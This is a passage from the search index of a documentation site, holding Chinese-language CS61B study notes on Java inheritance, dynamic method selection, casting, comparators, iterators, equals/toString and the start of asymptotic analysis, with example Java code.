\u91cd\u5199\u662f\u6307\u5b50\u7c7b\u4e2d\u6709\u4e00\u4e2a\u65b9\u6cd5\u4e0e\u7236\u7c7b\u4e2d\u7684\u67d0\u4e2a\u65b9\u6cd5\u5177\u6709\u76f8\u540c\u7684\u65b9\u6cd5\u540d\uff0c\u8fd4\u56de\u7c7b\u578b\u548c\u53c2\u6570\u5217\u8868\uff0c\u5b50\u7c7b\u901a\u8fc7\u91cd\u5199\u65b9\u6cd5\u53ef\u4ee5\u63d0\u4f9b\u4e13\u5c5e\u7684\u5b9e\u73b0\u4e0e\u7ee7\u627f\u6709\u5173</p> </li> <li> <p><code>@Override</code>\u6807\u7b7e</p> </li> <li> <p>\u5982\u679c\u51fa\u73b0\u62fc\u5199\u9519\u8bef\uff0c\u7f16\u8bd1\u5668\u4f1a\u63d0\u793a\u4fee\u6b63</p> </li> <li>\u63d0\u9192\u7a0b\u5e8f\u5458\u8fd9\u4e2a\u65b9\u6cd5\u6765\u81ea\u4e8e\u8d85\u7c7b</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#83_implementation_inheritance_default_methods","title":"8.3 Implementation Inheritance: Default Methods","text":"<p>\u4f7f\u7528<code>default</code>\u5173\u952e\u5b57\u4f7f\u5f97\u5b50\u7c7b\u4e5f\u53ef\u4ee5\u4ece\u63a5\u53e3\u4e2d\u7ee7\u627f\u5b9e\u73b0\uff0c\u8fd9\u4e2a\u9ed8\u8ba4\u65b9\u6cd5\u53ef\u4ee5\u5728\u5b50\u7c7b\u4e2d\u91cd\u5199<code>override</code></p> <pre><code>public interface List61B&lt;Item&gt; {\n   public void addFirst(Item x);\n    ...\n   default public void print() {\n      for (int i = 0; i &lt; size(); i += 1) {\n         System.out.print(get(i) + \" \");\n      }\n      System.out.println();\n   }\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#84_static_and_dynamic_type_dynamic_method_selection","title":"8.4 Static and Dynamic Type, Dynamic Method Selection","text":"<ol> <li> <p>\u9759\u6001\u7c7b\u578b\u662f\u6307\u53d8\u91cf\u5728\u7f16\u8bd1\u65f6\u7684\u7c7b\u578b</p> </li> <li> <p>\u5728\u58f0\u660e<code>declaration</code>\u65f6\u786e\u5b9a\uff0c\u6c38\u8fdc\u4e0d\u4f1a\u6539\u53d8</p> </li> <li> <p>\u52a8\u6001\u7c7b\u578b\u662f\u53d8\u91cf\u5728\u8fd0\u884c\u65f6\u7684\u7c7b\u578b</p> </li> <li> <p>\u5728\u5b9e\u4f8b\u5316<code>instantiation</code>\u7684\u65f6\u5019\u786e\u5b9a    (e.g. when using <code>new</code>)</p> </li> <li> <p>\u7b49\u4e8e\u6240\u6307\u5411\u5bf9\u8c61\u7684\u7c7b\u578b</p> </li> <li> <p>Dynamic Method Selection For Overridden Methods \u52a8\u6001\u65b9\u6cd5\u9009\u62e9 \u5982\u679c\u901a\u8fc7\u4e00\u4e2a\u53d8\u91cf\u8c03\u7528\u5bf9\u8c61\u7684\u65b9\u6cd5</p> </li> <li> <p>\u9759\u6001\u7c7b\u578b<code>X</code></p> </li> <li>\u52a8\u6001\u7c7b\u578b<code>Y</code>    \u5982\u679c\u5728<code>Y</code>\u4e2d\u91cd\u5199\u4e86\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u90a3\u4e48<code>Y</code>\u4e2d\u91cd\u5199\u7684\u65b9\u6cd5\u4f1a\u88ab\u8c03\u7528</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#85_signature_selection_dynamic_method_selection","title":"8.5 Signature Selection, Dynamic Method Selection","text":"<pre><code>public interface Animal {\n    default void greet(Animal a) {\n        print(\"hello animal\"); \n    }\n    default void sniff(Animal a) {\n        print(\"sniff animal\"); \n    }\n    default void praise(Animal a) {\n        print(\"u r cool animal\"); \n    }\n}\n\npublic class Dog implements Animal {\n    @Override\n    void sniff(Animal a) {\n        print(\"dog sniff animal\");\n    }\n    /* default void praise(Animal a) */\n    void praise(Dog a) {\n        print(\"u r cool dog\");\n    }\n}\n\nAnimal a = new Dog();\nDog d = new Dog();\na.greet(d); // \"hello animal\"\na.sniff(d); // \"dog sniff animal\"\nd.praise(d); // \"u r cool dog\"\na.praise(d); // \"u r cool animal\"\n</code></pre> <p>\u8003\u8651\u52a8\u6001\u65b9\u6cd5\u7684\u9009\u62e9\u8fc7\u7a0b\u5206\u4e3a\u4e24\u6b65</p> <ul> <li>\u7f16\u8bd1\u65f6\uff1a\u51b3\u5b9a\u8c03\u7528\u51fd\u6570\u7684\u7b7e\u540d \u7b7e\u540d\u4ec5\u7531\u9759\u6001\u7c7b\u578b\u51b3\u5b9a</li> </ul> <pre><code>Animal a = new Dog();\nDog d = new Dog();\na.greet(d);  // greet(Animal a)\na.sniff(d);  // sniff(Animal a)\nd.praise(d); // praise(Dog a)\na.praise(d); // praise(Animal a)\n</code></pre> <ul> <li>\u8fd0\u884c\u65f6\uff1a\u8c03\u7528\u5bf9\u8c61\u7684\u52a8\u6001\u7c7b\u578b\u4f7f\u7528\u5177\u6709\u786e\u5207\u6b64\u7c7b\u578b\u7684\u7b7e\u540d\u7684\u65b9\u6cd5 (\u5982\u679c\u6709)</li> </ul> <pre><code>Animal a = new Dog();\nDog d = new Dog();\na.greet(d); // greet(Animal a) - \"hello animal\"\na.sniff(d); // sniff(Animal a) - \"dog sniff animal\"\nd.praise(d);// praise(Dog a) - \"u r cool dog\"\na.praise(d);// praise(Animal a) - \"u r cool animal\"\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#86_interface_vs_implementation_inheritance","title":"8.6 Interface vs. Implementation Inheritance","text":"<ul> <li>\u63a5\u53e3\u7ee7\u627f\uff1a\u4ee5\u4e00\u79cd\u5f3a\u5927\u3001\u7b80\u5355\u7684\u65b9\u5f0f\u6cdb\u5316\u4ee3\u7801</li> <li>\u5b9e\u73b0\u7ee7\u627f\uff1a\u5b50\u7c7b\u53ef\u4ee5\u4f9d\u8d56\u63a5\u53e3\u6216\u8005\u8d85\u7c7b\u7684\u65b9\u6cd5\uff0c\u5b50\u7c7b\u53ef\u4ee5\u81ea\u884c\u51b3\u5b9a\u662f\u5426\u8986\u76d6\u9ed8\u8ba4\u5b9e\u73b0</li> </ul>"},{"location":"cs61b%20notes/w1dsy2ew/#lec9_extends_casting_higher_order_functions","title":"Lec.9 Extends, Casting, Higher Order Functions","text":""},{"location":"cs61b%20notes/w1dsy2ew/#91_extends","title":"9.1 <code>extends</code>\u5173\u952e\u5b57","text":"<ul> <li>\u5f53\u4e00\u4e2a\u7c7b\u662f\u63a5\u53e3\u7684\u4e0b\u4e49\u8bcd\u65f6\uff0c\u6211\u4eec\u4f7f\u7528<code>implements</code></li> <li>\u8ba9\u4e00\u4e2a\u7c7b\u662f\u53e6\u4e00\u4e2a\u7c7b\u7684\u4e0b\u4e49\u8bcd (\u800c\u4e0d\u662f\u63a5\u53e3)\uff0c\u4f7f\u7528<code>extends</code></li> </ul> <pre><code>/* implements \u5173\u952e\u5b57 */\nSLList&lt;Blorp&gt; implements List61B&lt;Blorp&gt;\n/* extends \u5173\u952e\u5b57 */\npublic class RotatingSLList&lt;Blorp&gt; extends SLList&lt;Blorp&gt;\n</code></pre> <ol> <li> <p>\u7531\u4e8e<code>extends</code>\uff0c<code>RotatingSLList</code>\u7ee7\u627f\u4e86<code>SLList</code>\u7684\u6240\u6709\u6210\u5458:</p> </li> <li> <p>\u6240\u6709\u5b9e\u4f8b\u548c\u9759\u6001\u53d8\u91cf</p> </li> <li>\u6240\u6709\u65b9\u6cd5</li> <li>\u6240\u6709\u5d4c\u5957\u7c7b</li> <li>\u6784\u9020\u51fd\u6570\u4e0d\u7ee7\u627f\uff01</li> <li> <p>\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u5728\u8d85\u7c7b\u4e2d\u5b9a\u4e49\u7684\u79c1\u6709\u65b9\u6cd5\u53ca\u53d8\u91cf    **\u901a\u8fc7<code>super.</code>\u8bbf\u95ee</p> </li> <li> <p>\u6784\u9020\u51fd\u6570\u884c\u4e3a</p> <ul> <li><code>java</code>\u89c4\u5b9a\u6240\u6709\u6784\u9020\u51fd\u6570\u5fc5\u987b\u5148\u8c03\u7528\u8d85\u7c7b\u7684\u6784\u9020\u51fd\u6570</li> <li>\u53ef\u4ee5\u4f7f\u7528\u5173\u952e\u5b57<code>super</code>(\u6ca1\u6709\u70b9<code>.</code>)\u6765\u663e\u5f0f\u8c03\u7528\u6784\u9020\u51fd\u6570\uff0c\u5982\u679c\u6ca1\u6709\u663e\u5f0f\u8c03\u7528\uff0c<code>java</code>\u5c06\u81ea\u52a8\u8c03\u7528\u9ed8\u8ba4\u7684\u8d85\u7c7b\u6784\u9020\u51fd\u6570</li> </ul> <pre><code>/* \u4e00\u4e0b\u4e3a\u7b49\u4ef7\u7684\u6784\u9020\u51fd\u6570 */\npublic VengefulSLList() {\ndeletedItems = new SLList&lt;Item&gt;();\n}\n\npublic VengefulSLList() {\nsuper();\ndeletedItems = new SLList&lt;Item&gt;();\n}\n</code></pre> <ul> <li>\u5982\u679c\u60f3\u4f7f\u7528\u9664\u65e0\u53c2\u6570\u6784\u9020\u51fd\u6570\u4e4b\u5916\u7684\u8d85\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u7ed9<code>super</code>\u4f20\u9012\u53c2\u6570</li> </ul> <pre><code>/* \u4ee5\u4e0b\u6784\u9020\u51fd\u6570\u4e0d\u7b49\u4ef7\uff01*/\npublic VengefulSLList(Item x) {\nsuper(x);\ndeletedItems = new SLList&lt;Item&gt;();\n}\n/* \u53ea\u8c03\u7528\u4e86\u7a7a\u53c2\u6570\u7684super() */\npublic VengefulSLList(Item x) {\ndeletedItems = new SLList&lt;Item&gt;();\n}\n</code></pre> </li> <li> <p>\u4e8b\u5b9e\u4e0a\uff0c<code>java</code>\u7684\u6bcf\u79cd\u7c7b\u578b\u90fd\u662f<code>object</code>\u7c7b\u7684\u4e0b\u4f4d</p> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#92_encapsulation","title":"9.2 \u5c01\u88c5<code>encapsulation</code>","text":"<ol> <li> <p>\u6a21\u5757\uff1a\u4e00\u7ec4\u65b9\u6cd5\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u534f\u540c\u5de5\u4f5c\u5b8c\u6210\u76f8\u5173\u4efb\u52a1\u3002</p> <ul> <li>\u5982\u679c\u4e00\u4e2a\u6a21\u5757\u7684\u5b9e\u73b0\u88ab\u5b8c\u5168\u9690\u85cf\uff0c\u53ea\u80fd\u901a\u8fc7\u6587\u6863\u5316\u7684\u63a5\u53e3\u8bbf\u95ee\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6a21\u5757\u5c31\u53ef\u4ee5\u88ab\u89c6\u4e3a\u662f\u5c01\u88c5\u7684</li> </ul> </li> <li> <p>\u5c01\u88c5\u7684\u4f18\u70b9</p> </li> <li> <p>\u6570\u636e\u9690\u85cf\uff1a\u9690\u85cf\u5bf9\u8c61\u7684\u72b6\u6001\u4fe1\u606f\uff0c\u53ea\u66b4\u9732\u6709\u9650\u7684\u64cd\u4f5c\u754c\u9762</p> </li> <li>\u63a5\u53e3\u4e0e\u5b9e\u73b0\u5206\u79bb\uff1a\u5c01\u88c5\u5f3a\u8c03\u4e86\u63a5\u53e3 (<code>public</code>\u65b9\u6cd5) \u4e0e\u5b9e\u73b0 (<code>private</code>\u5c5e\u6027\u548c\u65b9\u6cd5) \u7684\u5206\u79bb\uff0c\u4f7f\u5f97\u4fee\u6539\u5b9e\u73b0\u4e0d\u4f1a\u5f71\u54cd\u4f7f\u7528\u8be5\u63a5\u53e3\u7684\u4ee3\u7801</li> <li>\u7075\u6d3b\u6027\u548c\u6269\u5c55\u6027\uff1a\u5728\u4e0d\u5f71\u54cd\u5176\u4ed6\u6a21\u5757\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u5bb9\u6613\u4fee\u6539\u548c\u6269\u5c55\u6a21\u5757\u7684\u529f\u80fd</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#93_cast","title":"9.3 \u7c7b\u578b\u8f6c\u6362<code>cast</code>","text":"<ol> <li> <p>\u4f7f\u7528<code>new</code>\u5173\u952e\u5b57\u7684\u8868\u8fbe\u5f0f\u51b3\u5b9a\u52a8\u6001\u7c7b\u578b</p> <pre><code>/* VengefulSLList \u662f SLList\uff0c\u56e0\u6b64\u5141\u8bb8\u5206\u914d */\nSLList&lt;Integer&gt; sl = new VengefulSLList&lt;Integer&gt;();\n/* SLList \u4e0d\u4e00\u5b9a\u662f VengefulSLList\uff0c\u56e0\u6b64\u7f16\u8bd1\u9519\u8bef */\nVengefulSLList&lt;Integer&gt; vsl = new SLList&lt;Integer&gt;();\n</code></pre> </li> <li> <p>\u5c06\u6240\u9700\u7c7b\u578b\u653e\u5728\u8868\u8fbe\u5f0f\u524d\u7684\u62ec\u53f7\u4e2d\uff0c\u4f7f\u7f16\u8bd1\u5668\u5c06\u8868\u8fbe\u5f0f\u89c6\u4e3a\u4e0d\u540c\u52a8\u6001\u7c7b\u578b</p> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#94_high_order_functions","title":"9.4 High Order Functions\u9ad8\u9636\u51fd\u6570","text":"<ol> <li> <p>\u5b9a\u4e49\uff1a\u5c06\u53e6\u4e00\u4e2a\u51fd\u6570\u89c6\u4e3a\u6570\u636e\u7684\u51fd\u6570 *(e.g. \u5c06\u51fd\u6570\u4f5c\u4e3a\u8f93\u5165)</p> <pre><code>public interface IntUnaryFunction {\n    int apply(int x);\n}\n\npublic class TenX implements IntUnaryFunction {\n    public int apply(int x) {\n        return 10 * x;\n}\n}\n\npublic class HoFDemo {\n    public static int do_twice(IntUnaryFunction f, int x) {\n        return f.apply(f.apply(x));\n}\n\n    public static void main(String[] args) {\n        System.out.println(do_twice(new TenX(), 2));\n    }\n}\n</code></pre> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec10_subtype_polymorphism_comparators_comparable","title":"Lec.10 Subtype Polymorphism, Comparators, Comparable","text":"<ol> <li> <p>\u5b50\u7c7b\u591a\u6001\u6027\uff1a\u4e3a\u4e0d\u540c\u7c7b\u578b<code>type</code>\u7684\u5b9e\u4f53\u63d0\u4f9b\u76f8\u540c\u7c7b\u578b\u7684\u63a5\u53e3<code>interface</code> \u901a\u8fc7\u7ee7\u627f\u548c\u63a5\u53e3\u5b9e\u73b0\u5bf9\u8c61\u7684\u7c7b\u578b\u7684\u66ff\u6362</p> </li> <li> <p>\u5982\u4e00\u4e2a\u5305\u542b<code>animal</code>\u7c7b\u578b\u7684\u6570\u7ec4\u53ef\u4ee5\u5305\u542b\u5176\u5b50\u7c7b\u578b\u5982<code>cat</code> <code>dog</code>\u7b49\u7c7b\u578b\u7684\u5143\u7d20</p> </li> <li> <p>\u663e\u5f0f\u9ad8\u9636\u51fd\u6570\uff1a\u5141\u8bb8\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u6216\u8005\u8fd4\u56de\u51fd\u6570\u7684\u51fd\u6570     \u51fd\u6570\u5f0f\u7f16\u7a0b\u601d\u60f3</p> </li> <li> <p>\u6bd4\u8f83\u5668<code>comparator</code></p> </li> <li> <p>\u5728<code>Java</code>\u4e2d\uff0c<code>Comparator</code>\u63a5\u53e3\u662f\u4e00\u4e2a\u529f\u80fd\u63a5\u53e3\uff0c\u7528\u4e8e\u5b9a\u4e49\u5bf9\u8c61\u7684\u6bd4\u8f83\u89c4\u5219</p> </li> <li><code>compare(T o1, T o2)</code>: \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c0f\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u8d1f\u6570\uff1b\u5982\u679c\u76f8\u7b49\uff0c\u8fd4\u56de0\uff1b\u5982\u679c\u5927\u4e8e\uff0c\u8fd4\u56de\u6b63\u6570</li> <li> <p><code>equals(Object obj)</code>: \u8fd9\u4e2a\u65b9\u6cd5\u7528\u4e8e\u6bd4\u8f83\u5f53\u524d\u6bd4\u8f83\u5668\u662f\u5426\u4e0e\u53e6\u4e00\u4e2a\u5bf9\u8c61\u76f8\u7b49</p> </li> <li> <p>\u6bd4\u8f83\u5668\u7684\u5b9e\u73b0</p> </li> <li> <p>\u5b9a\u4e49\u4e00\u4e2a\u7c7b<code>class</code>\u5b9e\u73b0<code>Comparator</code>\u63a5\u53e3</p> </li> <li>\u5b9e\u73b0<code>compare</code>\u65b9\u6cd5\uff0c\u6839\u636e\u81ea\u5b9a\u4e49\u7684\u903b\u8f91\u6bd4\u8f83\u4e24\u4e2a\u5bf9\u8c61</li> </ol> <pre><code>/* \u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u5927\u5c0f\uff0c\u5ffd\u7565\u5927\u5c0f\u5199 */\npublic class StringComparator implements Comparator&lt;String&gt; {\n    @Override\n    public int compare(String s1, String s2) {\n        return s1.compareToIgnoreCase(s2);\n    }\n}\n</code></pre> <ul> <li><code>Java 8</code>\u5f15\u5165\u4e86<code>Lambda</code>\u533f\u540d\u8868\u8fbe\u5f0f\uff0c\u4f7f\u5f97\u521b\u5efa\u6bd4\u8f83\u5668\u66f4\u52a0\u7b80\u6d01</li> </ul> <pre><code>Comparator&lt;String&gt; caseComparator = (s1, s2) -&gt; s1.compareToIgnoreCase(s2);\n</code></pre> <ol> <li> <p>\u603b\u7ed3</p> </li> <li> <p>Comparable\uff1a\u4e00\u4e2a\u5bf9\u8c61\u81ea\u8eab\u4e0e\u53e6\u4e00\u4e2a\u5bf9\u8c61\u6bd4\u8f83\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b\u578b\u7684<code>natural order</code>\u81ea\u7136\u987a\u5e8f    <code>compareTo</code>\u65b9\u6cd5</p> </li> <li>Comparator\uff1a\u7c7b\u4f3c\u4e00\u4e2a\u7b2c\u4e09\u65b9\u53bb\u6bd4\u8f83\u4e24\u4e2a\u5bf9\u8c61    \u7531\u4e8e<code>compareTo</code>\u65b9\u6cd5\u53ea\u6709\u4e00\u4e2a\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u9700\u8981\u591a\u79cd\u6bd4\u8f83\u65b9\u5f0f\u662f\uff0c\u6211\u4eec\u5e94\u8be5\u9009\u62e9<code>Comparator</code></li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec11_exceptions_iterators_object_methods","title":"Lec.11 Exceptions, Iterators, Object Methods","text":"<p>The end of Java!</p>"},{"location":"cs61b%20notes/w1dsy2ew/#111_exception","title":"11.1 \u629b\u51fa\u5f02\u5e38<code>exception</code>\u7684\u8bed\u6cd5","text":"<p><code>throw new ExceptionObject(parameter1, ...)</code></p> <pre><code>/* Associates the specified value with the specified key in this map.\n   Throws an IllegalArgumentException if the key is null. */\npublic void add(T x) {\n    if (x == null) {\n        throw new IllegalArgumentException(\"can't add null\");\n    }\n    if (contains(x)) {\n        return;\n    }\n    items[size] = x;\n    size += 1;\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#112_iterator","title":"11.2 Iterator","text":"<ol> <li> <p><code>enhanced loop</code> \u53ef\u89c1 <code>Lec1.2.4</code></p> <pre><code>Set&lt;String&gt; s = new HashSet&lt;&gt;();\n...\nfor (String city : s) {\n    ...\n}\n</code></pre> <p>\u53ef\u8f6c\u6362\u4e3a\uff1a</p> <pre><code>Set&lt;String&gt; s = new HashSet&lt;&gt;();\n...\nIterator&lt;String&gt; seer = s.iterator();\nwhile (seer.hasNext()) {\n    String city = seer.next();\n    ...\n}\n</code></pre> </li> <li> <p>\u8fed\u4ee3\u5668\u7684\u5b9e\u73b0</p> </li> <li> <p>\u63a5\u53e3\uff1a</p> </li> </ol> <pre><code>public interface Iterator&lt;T&gt; {\n    boolean hasNext();\n    T next();\n}\n\npublic interface Iterable&lt;T&gt; {\n    Iterator&lt;T&gt; iterator();\n}\n\npublic interface List&lt;T&gt; extends Iterable&lt;T&gt;{\n    ...\n}\n</code></pre> <pre><code>/* \u5d4c\u5957\u5728ArraySet\u7c7b\u7684\u5185\u90e8 */\nprivate class ArraySetIterator implements Iterator&lt;T&gt; {\n    private int wizPos;\n    /* \u6784\u9020\u51fd\u6570 */\n    public ArraySetIterator() {\n        wizPos = 0;\n    }\n    /* \u68c0\u67e5 */\n    public boolean hasNext() {\n        return wizPos &lt; size;\n    }\n\n    public T next() {\n        T returnItem = items[wizPos];\n        wizPos += 1;\n        return returnItem;\n    }\n}\n/* \u5b9e\u73b0Iratable\u63a5\u53e3\uff0c\u4ece\u800c\u8ba9ArraySet\u7c7b\u80fd\u4f7f\u7528\u589e\u5f3afor\u5faa\u73af */\npublic Iterator&lt;T&gt; iterator() {\n    return new ArraySetIterator();\n}\n</code></pre> <ol> <li> <p>\u5b8c\u6574\u5b9e\u73b0\uff1a</p> <pre><code>import java.util.Iterator;\n\npublic class ArraySet&lt;T&gt; implements Iterable&lt;T&gt; {\n    private T[] items;\n    private int size; \n    // the next item to be added will be at position size\n\n    public ArraySet() {\n        items = (T[]) new Object[100];\n        size = 0;\n    }\n\n    /* Returns true if this map contains a mapping for the specified key. */\n    public boolean contains(T x) {\n        for (int i = 0; i &lt; size; i += 1) {\n            if (items[i].equals(x)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    /* Associates the specified value with the specified key in this map.\n    Throws an IllegalArgumentException if the key is null. */\n    public void add(T x) {\n        if (x == null) {\n            throw new IllegalArgumentException(\"can't add null\");\n        }\n        if (contains(x)) {\n            return;\n        }\n        items[size] = x;\n        size += 1;\n    }\n\n    /* Returns the number of key-value mappings in this map. */\n    public int size() {\n        return size;\n    }\n\n    /** returns an iterator (a.k.a. seer) into ME */\n    public Iterator&lt;T&gt; iterator() {\n        return new ArraySetIterator();\n    }\n\n    private class ArraySetIterator implements Iterator&lt;T&gt; {\n        private int wizPos;\n\n        public ArraySetIterator() {\n            wizPos = 0;\n        }\n\n        public boolean hasNext() {\n            return wizPos &lt; size;\n        }\n\n        public T next() {\n            T returnItem = items[wizPos];\n            wizPos += 1;\n            return returnItem;\n        }\n    }\n\n    public static void main(String[] args) {\n        ArraySet&lt;Integer&gt; aset = new ArraySet&lt;&gt;();\n        aset.add(5);\n        aset.add(23);\n        aset.add(42);\n\n        //iteration\n        for (int i : aset) {\n            System.out.println(i);\n        }\n    }\n}\n</code></pre> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#113_object_methods","title":"11.3 Object Methods","text":"<ol> <li> <p>\u6240\u6709\u7684\u7c7b\u90fd\u4ece\u6700\u9876\u5c42\u7684<code>Object</code>\u7c7b\u7ee7\u627f\u4e86\u82e5\u5e72\u65b9\u6cd5</p> </li> <li> <p><code>String toString()</code></p> </li> <li><code>boolean equals(Object obj)</code></li> <li><code>Class&lt;?&gt; getClass()</code></li> <li><code>int hashCode()</code></li> <li><code>protected Object clone()</code></li> <li><code>protected void finalize()</code></li> <li><code>void notify()</code></li> <li><code>void notifyAll()</code></li> <li><code>void wait()</code></li> <li><code>void wait(long timeout)</code></li> <li> <p><code>void wait(long timeout, int nanos)</code></p> </li> <li> <p>\u4e3aArraySet\u7c7b\u91cd\u5199<code>toString</code>\u65b9\u6cd5\uff1a</p> </li> <li> <p>\u5982\u679c\u76f4\u63a5\u4f7f\u7528<code>+</code>\uff0c\u4f1a\u6bcf\u6b21\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u4e32\u5bf9\u8c61\uff0c\u975e\u5e38\u4f4e\u6548</p> </li> <li> <p><code>StringBuilder</code>\u521b\u5efa\u4e00\u4e2a\u53ef\u53d8\u7684\u5b57\u7b26\u4e32\u5bf9\u8c61</p> <pre><code>public String toString() {\n    StringBuilder returnSB = new StringBuilder(\"{\");\n    for (int i = 0; i &lt; size - 1; i += 1) {\n        returnSB.append(items[i].toString());\n        returnSB.append(\", \");\n    }\n    returnSB.append(items[size - 1]);\n    returnSB.append(\"}\");\n    return returnSB.toString();\n}\n</code></pre> </li> <li> <p>\u91cd\u5199<code>equals</code>\u65b9\u6cd5\uff1a</p> </li> <li> <p><code>equals</code>\u4e0e<code>==</code>\u5177\u6709\u4e0d\u540c\u7684\u884c\u4e3a</p> </li> <li><code>==</code>\u68c0\u67e5\u4e24\u4e2a\u76d2\u5b50\u662f\u5426\u5305\u542b\u76f8\u540c\u7684\u5185\u5bb9\u3002\u5bf9\u4e8e\u57fa\u672c\u7c7b\u578b\uff0c\u8fd9\u610f\u5473\u7740\u68c0\u67e5\u503c\u662f\u5426\u76f8\u7b49\u3002\u5bf9\u4e8e\u5bf9\u8c61\uff0c\u8fd9\u610f\u5473\u7740\u68c0\u67e5\u5730\u5740/\u6307\u9488\u662f\u5426\u76f8\u7b49</li> <li><code>equals(Object o)</code>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7c7b\u4f3c\u4e8e<code>==</code>\uff0c\u68c0\u67e5<code>this</code>\u7684\u5185\u5b58\u5730\u5740\u662f\u5426\u4e0e<code>o</code>\u76f8\u540c</li> <li> <p>\u91cd\u5199\u540e\u7248\u672c\uff1a</p> <pre><code>public boolean equals(Object other) {\n    if (this == other) { // \u907f\u514d\u989d\u5916\u5de5\u4f5c\n        return true;\n    }\n    if (other == null) { // \u907f\u514d\u5f02\u5e38\n        return false;\n    }\n    if (other.getClass() != this.getClass()) {\n        return false; // \u907f\u514d\u5f02\u5e38\n    }\n    ArraySet&lt;T&gt; o = (ArraySet&lt;T&gt;) other;\n    if (o.size() != this.size()) {\n        return false;\n    }\n    for (T item : this) {\n        if (!o.contains(item)) {\n            return false;\n        }\n    }\n    return true;\n}\n</code></pre> </li> <li> <p>\u5b9e\u73b0<code>equals</code>\u9700\u8981\u9075\u5b88\u7684\u89c4\u5219</p> </li> <li> <p><code>equals</code>\u5fc5\u987b\u662f\u7b49\u4ef7\u5173\u7cfb</p> <ul> <li>\u81ea\u53cd\u6027\uff1a<code>x.equals(x)</code>\u4e3a<code>true</code></li> <li>\u5bf9\u79f0\u6027\uff1a\u5982\u679c<code>x.equals(y)</code>\uff0c\u5219<code>y.equals(x)</code>\u4e5f\u4e3a<code>true</code></li> <li>\u4f20\u9012\u6027\uff1a\u5982\u679c<code>x.equals(y)</code>\u548c<code>y.equals(z)</code>\uff0c\u5219<code>x.equals(z)</code>\u4e5f\u4e3a<code>true</code></li> </ul> </li> <li>\u5b83\u5fc5\u987b\u63a5\u53d7\u4e00\u4e2a<code>Object</code>\u53c2\u6570\uff0c\u4ee5\u4fbf\u8986\u76d6\u539f\u59cb\u7684<code>.equals()</code>\u65b9\u6cd5</li> <li>\u5982\u679c<code>x.equals(y)</code>\uff0c\u90a3\u4e48\u53ea\u8981<code>x</code>\u548c<code>y</code>\u4fdd\u6301\u4e0d\u53d8\uff1a<code>x</code>\u5fc5\u987b\u7ee7\u7eed\u7b49\u4e8e<code>y</code></li> <li>\u5bf9\u4e8e<code>null</code>\uff0c\u5b83\u6c38\u8fdc\u4e0d\u4e3a<code>true</code>\uff0c<code>x.equals(null)</code>\u5fc5\u987b\u4e3a<code>false</code></li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec13_introduction_to_asymptotic_analysis","title":"Lec.13 Introduction to Asymptotic Analysis \u6e10\u8fdb\u6027\u5206\u6790","text":"<ol> <li> <p>\u8861\u91cf\u4ee3\u7801\u6548\u7387 <code>Measuring Code Efficiency</code></p> </li> <li> <p>\u7f16\u7a0b\u6210\u672c<code>Programming cost</code>\uff1a\u5f00\u53d1\u65f6\u95f4\u4ee5\u53ca\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u3001\u53ef\u7ef4\u62a4\u6027</p> </li> <li> <p>\u6267\u884c\u6210\u672c<code>Programming cost</code>\uff1a\u7a0b\u5e8f\u7684\u6267\u884c\u65f6\u95f4\u548c\u5185\u5b58\u9700\u6c42</p> </li> <li> <p>\u6e10\u8fdb\u5206\u6790 <code>Asymptotic Analysis</code>:</p> </li> <li> <p>(\u53ea)\u8003\u8651\u6700\u574f\u60c5\u51b5<code>care only about the worst case</code></p> </li> <li>\u5ffd\u7565\u4f4e\u9636\u9879<code>Ignore lower order terms</code></li> <li>\u5ffd\u7565\u4e58\u6cd5\u5e38\u6570<code>Ignore any coefficients</code></li> <li> <p>\u8ba4\u4e3a\u6240\u6709\u64cd\u4f5c\u8017\u65f6\u76f8\u7b49<code>All operations take the same time</code></p> </li> <li> <p>\u6e10\u8fdb\u7b26\u53f7 <code>Asymptotic Notation</code></p> <ol> <li>Big Theta (\u0398)\uff1a\u8868\u793a\u51fd\u6570\u7684\u589e\u957f\u7387</li> <li>N<sup>3</sup> + 3N<sup>4</sup> \u2208 \u0398(N<sup>4</sup>)</li> <li>\u8fd9\u610f\u5473\u7740\u5b58\u5728\u4e24\u4e2a\u6b63\u7684\u5e38\u6570<code>k1</code>\u548c<code>k2</code>\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u8db3\u591f\u5927\u7684<code>N</code>\uff0c\u4e0b\u5217\u4e0d\u7b49\u5f0f\u6210\u7acb (\u8868\u793a<code>R(N)</code>\u7684\u589e\u957f\u7387\u4e0e<code>f(N)</code>\u76f8\u540c):     <code>k1 * f(N) \u2264 R(N) \u2264 k2 * f(N)</code> </li> <li>Big O (\u039f)\uff1a\u8868\u793a\u589e\u957f\u7684\u4e0a\u754c</li> <li>\u5982\u679c\u6709\u4e00\u4e2a\u51fd\u6570<code>R(N)</code>\u7684\u589e\u957f\u4e0d\u8d85\u8fc7<code>g(N)</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u7528<code>Big 